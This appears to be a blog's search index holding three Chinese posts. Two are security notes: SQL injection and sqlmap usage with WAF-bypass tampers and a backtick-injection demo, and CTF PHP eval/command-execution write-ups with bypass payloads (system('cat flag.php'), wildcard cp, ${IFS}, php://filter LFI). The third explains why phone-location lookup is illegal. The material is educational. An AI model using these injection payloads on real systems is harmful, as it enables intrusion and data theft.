<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/02/15/Sqlmap18%E5%8F%B7%E5%88%86%E4%BA%AB/"/>
    <url>/2023/02/15/Sqlmap18%E5%8F%B7%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<h3 id="SQL注入笔记——Edit-by-Hong-zhong"><a href="#SQL注入笔记——Edit-by-Hong-zhong" class="headerlink" title="SQL注入笔记——Edit by Hong_zhong"></a>SQL注入笔记——Edit by Hong_zhong</h3><p>1、最简单的联合注入</p><p>首先判断闭合类型</p><ul><li>数字型闭合：id&#x3D;1时的结果与id&#x3D;2-1时的结果一致</li><li>字符型闭合：id&#x3D;1时和id&#x3D;1a时一致，再去深入判断具体类型</li></ul><p>判断字段数</p><p>?id&#x3D;1’ order by 1</p><p>?id&#x3D;1’ order by 2</p><p>…….</p><p>直至报错或者无回显</p><p>爆库名</p><p>id&#x3D;-1’ union select 1,2,database() –+</p><p>select后面的1,2,3……根据字段数适当改变</p><p>必背</p><p>爆表名</p><p>group_concat(table_name)联合查询表名</p><p>information_schema.tables数据库中对应的表</p><p>table_schema表的上层数据库</p><p>爆字段名</p><p>group_concat(column_name)联合查询字段名</p><p>information_schema.columns数据库中对应的表</p><p>table_name&#x3D;想查询的表</p><p>kobe’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</p><p>xssblind</p><h2 id="Sqlmap笔记——Edit-by-Hong-zhong"><a href="#Sqlmap笔记——Edit-by-Hong-zhong" class="headerlink" title="Sqlmap笔记——Edit by Hong_zhong"></a>Sqlmap笔记——Edit by Hong_zhong</h2><h4 id="Sqlmap简介："><a href="#Sqlmap简介：" class="headerlink" title="Sqlmap简介："></a>Sqlmap简介：</h4><p>Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p><p>目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access等大多数据库。</p><h4 id="Sqlmap使用："><a href="#Sqlmap使用：" class="headerlink" title="Sqlmap使用："></a>Sqlmap使用：</h4><h6 id="最基础的Sqlmap的使用如下"><a href="#最基础的Sqlmap的使用如下" class="headerlink" title="最基础的Sqlmap的使用如下:"></a>最基础的Sqlmap的使用如下:</h6><p><code>sqlmap.py -u &quot;url&quot; --dbs --batch</code>  爆库</p><p><code>sqlmap.py -u &quot;url -D 库名 --tables --batch</code>  爆表</p><p>–后一般接单词&#x2F;缩写                                              -后一般接字母</p><p>-u+url                       -r+抓包文件</p><p>-D后接库名，-T后接表名，-C后接字段名</p><p>爆出字段名之后使用<em>dump</em>列出某字段的具体数据</p><h6 id="统一使用："><a href="#统一使用：" class="headerlink" title="统一使用："></a>统一使用：</h6><p>cookie注入：<code>sqlmap.py -u 注入点 --cookie &quot;参数&quot; --tables --level 2</code></p><p>POST登录框注入：<code>sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables</code></p><p>如果觉得保存到文本中再去跑SQL注入比较麻烦，那么sqlmap还集成了谷歌的搜索模块，即提供了google搜索引擎的搜索</p><p>使用方式为 -g 搜索表达式，</p><p>sqlmap -g 搜索语句就可以直接调用Google引擎进行批量化扫描</p><p> <code>sqlmap.py -u 登录的地址 --forms </code>自动判断注入</p><p> <code>sqlmap.py -u 登录的地址 --data</code> “指定参数”</p><p>绕过waf防火墙：<code>sqlmap.py -u 注入点 -v 3 --dbs --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py</code></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/afdf7f51a6d74bc08bf7bb4d2ea6896c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p><h4 id="如何反制Sqlmap（图一乐"><a href="#如何反制Sqlmap（图一乐" class="headerlink" title="如何反制Sqlmap（图一乐"></a>如何反制Sqlmap（图一乐</h4><p>在前面的sqlmap简介中已经提到，sqlmap是一款自动化工具，而最经典的sqlmap使用在命令行中</p><p>这就造成了安全隐患，而这个安全隐患并非sqlmap独占，而是所有命令行工具都有可能面临的威胁</p><h6 id="bash命令"><a href="#bash命令" class="headerlink" title="bash命令"></a>bash命令</h6><p>先来介绍下bash命令</p><p>在bash命令中，某些字符在””中可能会有特殊的含义，例如   <strong>&#96;</strong></p><p>被反引号包裹在其中的字符会被当做系统命令来执行</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e8ced69e21c448998fc2dd3d3bc3fb62~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p><p>那么在sqlmap中也可以这样搞，先用docker拉一个pikachu来</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c8364a2dbcb4491eaafd0ac57dc23fb0~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p><p>执行<br>sqlmap -u “<a href="http://127.0.0.1:8000/vul/sqli/sqli_str.php/%60ls%60">http://127.0.0.1:8000/vul/sqli/sqli_str.php\`ls`</a>“</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c87c4710d7814d27973de7fcc93bc35c~tplv-k3u1fbpfcp-watermark.image" alt="图片.png"></p><p>在执行sqlmap检测的时候列出了自己当前系统的文件</p><h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/02/15/%E8%83%BD%E5%90%A6%E9%80%9A%E8%BF%87%E4%BB%96%E4%BA%BA%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%9F%A5%E8%AF%A2%E4%BB%96%E4%BA%BA%E4%BD%8D%E7%BD%AE/"/>
    <url>/2023/02/15/%E8%83%BD%E5%90%A6%E9%80%9A%E8%BF%87%E4%BB%96%E4%BA%BA%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%9F%A5%E8%AF%A2%E4%BB%96%E4%BA%BA%E4%BD%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p><strong>头部声明：如果您是来学怎么定位他人的，不好意思，这是违法行为，我不会，也不会教。</strong></p><p>以下是废话</p><blockquote><p> 事情是这样的</p><p>今天凌晨，班级群里突然炸了。</p><p>虽然我不咋看这群，但因为在我小号里就没设免打扰。</p><p>我一看，好家伙，人口失踪（不是</p><p>某位同学的一个外地朋友已经失联一天，在群里问该咋办。</p><p>秉承着人道主义的关怀<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7c9dcfb27d624535871d0c23a37589b2~tplv-k3u1fbpfcp-zoom-1.image"></p><p>我要了手机号，看看能不能查出来点什么。</p></blockquote><h2 id="简单在网上搜搜"><a href="#简单在网上搜搜" class="headerlink" title="简单在网上搜搜"></a>简单在网上搜搜</h2><p>我在网上查了一下，如果搜索“通过手机号查询他人位置”</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/25789ad0185a4f1b88d2c0348e24ead2~tplv-k3u1fbpfcp-zoom-1.image"></p><p> woc,居然有，那进去看看，一定要装一波<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/eef2c21d75ac44e1b9f5140c7e4525c3~tplv-k3u1fbpfcp-zoom-1.image"></p><p> <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/41237e96691d445ea37706f9f109445d~tplv-k3u1fbpfcp-zoom-1.image"></p><p> 看到这我就蚌埠住了</p><p>“尝试注入防御网”</p><p>不了解注入的可以看看我之前的文章<a href="https://blog.csdn.net/m0_55400802/article/details/127458779?spm=1001.2014.3001.5501" title="今年十八，喜欢SQL注入_迷雾安全-红中的博客-CSDN博客">今年十八，喜欢SQL注入_迷雾安全-红中的博客-CSDN博客</a></p><p>注入防御网。。。我只能说nb</p><p>同时科普一下：（软考要背的</p><p>刑法第二百八十五条：</p><p><strong>侵入国家事务，国防建设，尖端科学技术领域的计算机信息系统的，处三年以下（）</strong></p><p>所以说，看到这篇文章的哥们姐们，不要信可以通过手机号即可定位一个人，这在不违法的前提下是假的。</p><p>那为什么在某些电视剧里，可以通过手机定位呢？</p><p>接下来讲讲技术实现</p><h2 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h2><p>从技术层面上来讲，其实是可以通过手机号定位的</p><p>具体通过GPS、卫星系统与基站</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9da323c0f20f45b59c045405ed39653b~tplv-k3u1fbpfcp-zoom-1.image"></p><p>普遍情况下</p><p><strong>GPS：</strong></p><p>只要你还在地球表面，就随时会有六颗卫星在你头顶上转悠。</p><p><strong>卫星系统：</strong> <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d3592addd13449ed91be1960395b18f4~tplv-k3u1fbpfcp-zoom-1.image"></p><p> 卫星定位系统的地面客户端本质上是无源设备，即不向外发射信号。</p><p>仅通过接收卫星信号就可以确定自己的位置。</p><p>而卫星不断发出的信号实际上是自己在太空中的位置信息，再通过用信号传输速度乘以卫星与地面之间的传输时间，就可以得出卫星与客户端之间的距离。</p><p>也就是说，客户端从卫星那里获得了两个原始数据：卫星的位置，以及卫星距离自己的距离。</p><p>接下来需要</p><p>极其复杂<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0bc5d0cda47e4f20a184ac2fd5fc3a25~tplv-k3u1fbpfcp-zoom-1.image"></p><p>的数学运算 </p><p><strong>基站定位：</strong></p><p>基站定位顾名思义是就是配合地面信息通讯基站系统来实现的定位。</p><p>根据信号发出返回的时间差，再配合基站的地理位置，利用三个基站同时测量就可以准确的测量出个人所在的位置。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e6ebbf6af17d4d2caa065419f6c1f5da~tplv-k3u1fbpfcp-zoom-1.image"></p><p> 而现在常用的定位方式即为A-GPS</p><blockquote><p>A-GPS（Assisted GPS）即辅助GPS技术，它可以提高 <a href="https://baike.baidu.com/item/GPS/214654?fromModule=lemma_inlink" title="GPS">GPS</a> 卫星定位系统的性能。通过移动通信运营基站它可以快速地定位，广泛用于含有GPS功能的手机上。GPS通过卫星发出的无线电信号来进行定位。当在很差的信号条件下，例如在一座城市，这些信号可能会被许多不规则的建筑物、墙壁或树木削弱。在这样的条件下，非A-GPS 导航设备可能无法快速定位，而A-GPS 系统可以通过运营商基站信息来进行快速定位。——百度百科</p></blockquote><p>说原理可能比较晦涩，直接看图</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/89b98f0528f849f68b5492b3b3d39151~tplv-k3u1fbpfcp-zoom-1.image"></p><p>但是这几种定位方式，数据都是在国家手中保存的，就算是公安系统，也许要向上级请示才能够定位。</p><p>未经授权的行为是违法的！</p><h2 id="接着聊废话"><a href="#接着聊废话" class="headerlink" title="接着聊废话"></a>接着聊废话</h2><p>接着说回来，那边可能是人口失踪，刻不容缓<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a62dd2959d174a8bb99b68c7342d46c3~tplv-k3u1fbpfcp-zoom-1.image"></p><p> 所以我找了一位在警局工作的朋友求他托关系帮我问问怎么搞。</p><p>结果发现这手机关机了。。。</p><p>那从信息安全的角度来说行不通，我看看社工可不可以。</p><h2 id="简单聊聊社工"><a href="#简单聊聊社工" class="headerlink" title="简单聊聊社工"></a>简单聊聊社工</h2><p>最近社工的事件很火，今年阿里信息库泄露，还有更早的一个某公司数据泄露导致现如今大家的信息早已不是秘密。</p><p>在电报上，有很多的社工机器人，只要你有对方的手机&#x2F;QQ&#x2F;微信等账号，即可爆出对方的姓名，住址，身份信息，学院等等等等</p><p>这也俗称为“开盒”</p><p>是一种恶劣且严重的违法行为</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e75b19a980a14c0783432f69387d3990~tplv-k3u1fbpfcp-zoom-1.image"></p><p>最后呢，希望能够尽早联系上失联的哥们。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/02/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/02/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h3 id="文件执行——Edit-by-Hong-zhong"><a href="#文件执行——Edit-by-Hong-zhong" class="headerlink" title="文件执行——Edit by Hong_zhong"></a>文件执行——Edit by Hong_zhong</h3><h4 id="类型一——eval"><a href="#类型一——eval" class="headerlink" title="类型一——eval"></a>类型一——eval</h4><p>在题目最终语句为eval执行语句时，可以通过调用系统命令来操作</p><h5 id="例一、过滤flag："><a href="#例一、过滤flag：" class="headerlink" title="例一、过滤flag："></a>例一、过滤flag：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))<br> &#123;<br>   <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);`     <br>    &#125;   <br>    &#125;  <br> <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> &#125; <br></code></pre></td></tr></table></figure><p>那么可以看到，我们需要传入的变量为<strong>c</strong></p><p>同时过滤掉了flag字符</p><p>因为其中没有进行任何的过滤，且会执行<strong>c</strong></p><p>那我们就可以通过system(“ls”)直接调用系统命令来去观察目录结构</p><p>看到了flag.php，但是因为flag被过滤掉了，不能直接调用，那就可以使用<strong>cp</strong>来进行替换</p><p>cp命令全程（copy file），将前者中的文件复制到后者中，在复制的过程中，注意flag字符是被过滤的，所以要用**?**等通配符去进行替换</p><h5 id="例二、过滤system："><a href="#例二、过滤system：" class="headerlink" title="例二、过滤system："></a>例二、过滤system：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>关于本题，有招，在linux中，有一个符号可以将被它包裹的东西当作系统命令来运行</p><p>它就是——————————反引号</p><p>我们只需要传入payload:?c&#x3D;`cp fla?.??? 1.txt&#96;,然后访问1.txt即可，这里因为过滤掉了flag和php，用通配符代替下</p><h5 id="例三、相对难点的过滤"><a href="#例三、相对难点的过滤" class="headerlink" title="例三、相对难点的过滤"></a>例三、相对难点的过滤</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>可以看到，我们这里过滤的东西非常多，虽然但是反引号还活着，也不可以使用上一道题的方法直接走，因为空格没了,nnd</p><p>这里我们就可以采用一种新的方法：<strong>跳板</strong></p><p>思路就是题目要求我传进去个c</p><p>但是我传进去的c的内容是<em>执行a</em>，那a受不受过滤的限制？</p><p>不受</p><p>那么该如何实现呢?</p><p>首先我们的c要接收一个变量，定为1,那么肯定要执行接收的命令</p><p>就用到了</p><p><code>eval($_GET[1])</code></p><p>这是表示接收1的命令，那咋样才能定义这个1的值呢？</p><p>我们先结束这条语句，然后在后面用&amp;连接</p><p>1不受限制，那我们就可以直接写payload了</p><p>payload:?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(‘cat flag.php’);</p><p>这里用到了cat，简单来说就是显示后续文件内容的一条命令</p><p>执行完之后，发现。woc，空白的</p><p>别慌</p><p>我们查看下源代码即可得到flag</p><p>那有无更简单的办法？</p><p>咱不是用cat了吗，这玩意显示文件时候是按行正序，如果flag正好在末尾就不好办了</p><p>咋样才能按行倒序？</p><p>cat倒过来是啥？</p><p>tac！</p><p>诶嘿，把payload里的cat换成tac</p><p>得到flag</p><h5 id="例四、涉及到文件包含的绕过"><a href="#例四、涉及到文件包含的绕过" class="headerlink" title="例四、涉及到文件包含的绕过"></a>例四、涉及到文件包含的绕过</h5><p>文件包含漏洞，主要是因为以下的四个函数引起的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>()、<span class="hljs-keyword">include_once</span>()、<span class="hljs-keyword">require</span>()、<span class="hljs-keyword">require_once</span>()<br></code></pre></td></tr></table></figure><p>这里主要来说一说<strong>include</strong></p><p>include:包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</p><p>当我们使用这四个函数去包含文件时，无论被包含的是什么类型的文件，都会被当作PHP文件进行解析</p><p>文件包含有两种</p><p>分别是本地LFI和远程RFI</p><p>这道题我们用到了LFI中的php:&#x2F;&#x2F;filter</p><p>说说index2.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php的含义<br> 首先这是一个file关键字的get参数传递，php:&#x2F;&#x2F;是一种协议名称，php:&#x2F;&#x2F;filter&#x2F;是一种访问本地文件的协议，<code>/read=convert.base64-encode/</code>表示读取的方式是base64编码后，<code>resource=index.php</code>表示目标文件为index.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>那么在本题中可以这样应用</p><p>执行完之后我们得到了一串base64编码</p><p>直接解码看一下</p><h5 id="例五、在例四基础上稍微增加难度"><a href="#例五、在例四基础上稍微增加难度" class="headerlink" title="例五、在例四基础上稍微增加难度"></a>例五、在例四基础上稍微增加难度</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这道题相对于例四，没有什么太大的变化，所以我们可以使用例四的方法进行处理</p><p>那么咱们换一个方法</p><p>也是文件包含，那么咱们可以使用<strong>require</strong></p><p>require实际上和include没有太大的区别</p><p><strong>require () 语句的性能与 include () 相类似，都是包括并运行指定文件。不同之处在于：对 include () 语句来说，在执行文件时每次都要进行读取和评估；而对于 require () 来说，文件只处理一次</strong></p><h5 id="例N-黑洞"><a href="#例N-黑洞" class="headerlink" title="例N 黑洞"></a>例N 黑洞</h5><blockquote><p>1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</p></blockquote><p>&gt; 代表重定向到哪里，例如：echo “123” &gt; &#x2F;home&#x2F;123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;&#x2F;dev&#x2F;null”等同于”1&gt;&#x2F;dev&#x2F;null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p><p>使用&amp;&amp;绕过即可</p><p>空格被ban</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;cat,flag.txt&#125; <br><span class="hljs-meta prompt_">cat$</span><span class="language-bash">&#123;IFS&#125;flag.txt</span><br><span class="hljs-meta prompt_">cat$</span><span class="language-bash">IFS<span class="hljs-variable">$9flag</span>.txt</span><br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br></code></pre></td></tr></table></figure><ul><li><p>require 一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件；</p></li><li><p>include 一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程。</p></li><li><p>require 引入的文件有错误时，执行会中断，并返回一个致命错误；</p></li><li><p>include 引入的文件有错误时，会继续执行，并返回一个警告。</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
